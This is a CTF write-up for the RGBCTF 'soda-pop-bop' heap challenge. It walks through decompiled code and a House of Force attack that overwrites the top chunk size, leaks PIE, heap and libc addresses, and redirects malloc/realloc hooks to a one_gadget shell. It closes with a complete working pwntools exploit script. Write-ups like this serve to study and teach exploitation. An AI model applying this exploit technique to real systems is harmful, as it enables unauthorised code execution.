# rgbctf-pwn

`Writeup for RGBCTF soda-pop-bop challenge`



# HOUSE OF FORCE

#### The libc version was 2.27. And it doesn't have any checks for top chunk.
### Finding the bug was actually simple
```c
00000ccb  *party = malloc(zx.q(*party_size) << 5)
00000ce5  if (*party == 0)
00000ce5      puts(data_109f)  {"You can't have a party of 0!"}
00000cef      exit(1)
00000cef      noreturn
00000cfa  if (*party_size u<= 1)
00000d9b      puts(data_10da)  {"All alone...? I'm so sorry :("}
00000da7      *(*party + 0x18) = -1 <---------------- It puts the -1 to the top chunk if the Party size we give is "0".
00000db6      puts(data_10f8)  {"What's your name?"}
00000dc7      printf(data_f5f)
00000dd3      uint64_t rdx_7 = *party
00000de8      fgets(rdx_7, 0x18, stdin, rdx_7)
```
This else condition is never meant to execute. the party size is either 0/1 OR > 1. The if condition inside the while(True) loop never gets false because the variable is assigned 0 at the start and checks if (var) <= party_size. Which is always true. So the loop terminates and never gets executed.

```
00000d03  else
00000d03      int32_t var_c_1 = 0
00000d81      while (true)
00000d81          uint64_t rdx_6 = zx.q(var_c_1)
00000d8c          if (rdx_6:0.d u<= *party_size)
00000d8c              break
00000d1d          printf(data_10bc, zx.q(var_c_1), rdx_6)  {"What's the name of member %d?"}
00000d2e          printf(data_f5f)
00000d47          *(*party + (sx.q(var_c_1) << 5) + 0x18) = -1
00000d67          int64_t rdx_4 = *party + (sx.q(var_c_1) << 5)
00000d78          fgets(rdx_4, 0x18, stdin, rdx_4)
00000d7d          var_c_1 = var_c_1 + 1
```


```c
00000df2  while (true)
00000df2      print_menu()
00000e06      char var_d_1 = _IO_getc(stdin):0.b
00000e13      _IO_getc(stdin)
00000e18      uint64_t rax_18 = zx.q(sx.d(var_d_1))
00000e1c      if (rax_18:0.d == 0x32)
00000e4a          get_drink()
00000e21      else
00000e21          if (rax_18:0.d s> 0x32)
00000e2d              if (rax_18:0.d == 0x33)
00000e56                  sing_song()
00000e5b                  continue
00000e62              else if (rax_18:0.d == 0x34)
00000e62                  exit(0)
00000e62                  noreturn
00000e26          else if (rax_18:0.d == 0x31)
00000e3e              choose_song()
00000e43              continue
00000e6e          puts(data_110a)  {"????"}
```


### choose_song function just asks for no.of bytes to allocate and reads the data into it.
```c
000009da  puts(data_f44)  {"How long is the song name?"}
000009eb  printf(data_f5f)
00000a03  int64_t var_18
00000a03  __isoc99_scanf(data_f62, &var_18)  {"%llu"}
00000a12  _IO_getc(stdin)
00000a23  *selected_song = malloc(var_18)
00000a31  puts(data_f67)  {"What is the song title?"}
00000a42  printf(data_f5f)
00000a52  uint64_t rcx = zx.q(var_18:0.d)
00000a60  fgets(*selected_song, zx.q(rcx:0.d), stdin, rcx)
```

### singsong() function just prints the pointer which is returened by malloc ( We leak addresses using this function. )
```c
000009bb  return printf(data_f2e, *selected_song)  {"You sang %p so well!\n"}
```

### The get_drink() function is quiet intresting
```c
00000a9a  puts(data_f7f)  {"What party member is buying?"}
00000aab  printf(data_f5f)
00000ac3  int32_t var_18
00000ac3  __isoc99_scanf(data_f9c, &var_18)
00000ad2  _IO_getc(stdin)
00000ae0  if (var_18 u>= *party_size)
00000aeb      puts(data_f9f)  {"That member doesn't exist."}
00000afc  else
00000afc      puts(data_fba)  {"What are you buying?"}
00000b08      puts(data_fcf)  {"0. Water"}
00000b14      puts(data_fd8)  {"1. Pepsi"}
00000b20      puts(data_fe1)  {"2. Club Mate"}
00000b2c      puts(data_fee)  {"3. Leninade"}
00000b3d      printf(data_f5f)
00000b55      int32_t var_14
00000b55      __isoc99_scanf(data_ffa, &var_14)
00000b64      _IO_getc(stdin)
00000b6c      if (var_14 s<= 3)
00000b97          *(*party + (zx.q(var_18) << 5) + 0x18) = sx.q(var_14)
00000b78      else
00000b78          puts(data_ffd)  {"We don't have that drink."}
```
I will explain it later on the writeup


### exploitation part.


The program asks for party size which is stored into bss.
```c
struct party {
    pointer_to_heap;
    party_size;
}
```

the size is stored into the partysize.
We start by giving party size zero. Giving zero malloc will return the smallest chunk. And the

```c
(*party + 0x18) = -1
```
A negative value is onto the topchunk size field, which gives us House of force primitive.

```py
Reference: https://www.youtube.com/watch?v=6-Et7M7qJJg

Max kamper has amazing video on house-of-force.
```

In the sing song function malloc returns the pointer to a bss variable ```c *selected_song```
Which contains a pie address when the program runs. This leaks the PIE,

Getting heap leak was simple
Allocate a normal chunk and print the address of the chunk using selected_song function again.

Using house of force, We get the heap to bss.
```py
def return_size(target, wilderness):
    return target - wilderness - 0x10
```
The helper function to return the bad size which will be passed to malloc.

We fully control the bss now.

I overwrote the partysize to a big value.

### The get_drink() function
```c
00000a9a  puts(data_f7f)  {"What party member is buying?"}
00000aab  printf(data_f5f)
00000ac3  int32_t var_18
00000ac3  __isoc99_scanf(data_f9c, &var_18)
00000ad2  _IO_getc(stdin)
00000ae0  if (var_18 u>= *party_size)
00000aeb      puts(data_f9f)  {"That member doesn't exist."}
00000afc  else
00000afc      puts(data_fba)  {"What are you buying?"}
00000b08      puts(data_fcf)  {"0. Water"}
00000b14      puts(data_fd8)  {"1. Pepsi"}
00000b20      puts(data_fe1)  {"2. Club Mate"}
00000b2c      puts(data_fee)  {"3. Leninade"}
00000b3d      printf(data_f5f)
00000b55      int32_t var_14
00000b55      __isoc99_scanf(data_ffa, &var_14)
00000b64      _IO_getc(stdin)
00000b6c      if (var_14 s<= 3)
00000b97          *(*party + (zx.q(var_18) << 5) + 0x18) = sx.q(var_14)
00000b78      else
00000b78          puts(data_ffd)  {"We don't have that drink."}
```
The get drink function first takes unsigned integer.

And it checks if the input integer is greater or equal to the party size.
If it is then it's terminates the function.
When we get our heap transfered to bss.
There is a topchunk size field on bss.

The else part of this code does is it scans an integer, and checks if it is less than equals to 3.
### We can give negative values here. (;
The later part will write the value we gave to the address of *party + `blablamath`
We can change the top chunk size here By just calculating offset with trial and error.

First i changed the top chunk size to 0.

and allocate a big chunk of size
```py
0x210000
```

The chunk we will recieve will be mmaped chunk. Right before libcbase, ALIGNED.
Selected song contains the address of this mmaped chunk.
We leak libc.
Now we change the Top chunk again to -1.
HOUSE OF FORCE PRIMITIVE AGAIN.

One_gadget constraints weren't matching so,
I change malloc hook (& realloc + 8) and realloc hook to onegaget.

And pop the shell.

```py
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host challenge.rgbsec.xyz --port 6969 ./spb
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./spb')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'challenge.rgbsec.xyz'
port = int(args.PORT or 6969)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

def init(size, name):
    io.recvuntil('> ')
    io.sendline(str(size))
    io.recvuntil('> ')
    io.sendline(name)

def getleak():
    io.recvuntil('> ')
    io.sendline('3')

def choose(size, data):
    io.recvuntil('> ')
    io.sendline('1')
    io.recvuntil('> ')
    io.sendline(str(size))
    io.recvuntil('> ')
    io.sendline(data)

def getdrink(member, fuck):
    io.recvuntil('> ')
    io.sendline('2')
    io.recvuntil('> ')
    io.sendline(str(member))
    io.recvuntil('> ')
    io.sendline(str(fuck))

def return_size(target, wilderness):
    return target - wilderness - 0x10

init(0, 'H'*0x17)
io.sendline()
getleak()
io.recvuntil('You sang ')
pie = int(io.recvn(14), 0) - 0xf08
log.info('Pie leak {}'.format(hex(pie)))
choose(0x18, 'K'*0x17)
io.sendline()
getleak()
io.recvuntil('You sang ')
heap = int(io.recvn(14), 0)
log.info('Heap leak {}'.format(hex(heap)))
target_address = pie + 0x202040
choose(return_size(target_address, heap + 0x10), 'A')
choose(0x110, p64(pie + 0x202050) + p64(0x7f7f7f7f7f7f7f7f))
getdrink(8, 0)
choose(0x210000, 'AAAA')
getleak()
io.recvuntil('You sang ')
libc.address = int(io.recvn(14), 0) + 0x210ff0
log.info('Libc leak {}'.format(hex(libc.address)))
getdrink(8, -1)
target2 = libc.sym.__realloc_hook - 0x8
choose(return_size(target2, pie + 0x202168), 'BBBBBBBB')
def attack(size, data):
    io.recvuntil('> ')
    io.sendline('1')
    io.recvuntil('> ')
    io.sendline(str(size))
choose(0x110, p64(libc.address + 0x4f3c2) + p64(libc.address + 0x10a45c ) + p64(libc.sym.realloc + 8) + 'AAAAAAA')
#pause()
attack(0x100, 'A')
io.interactive()
```

### third_blood ...
****

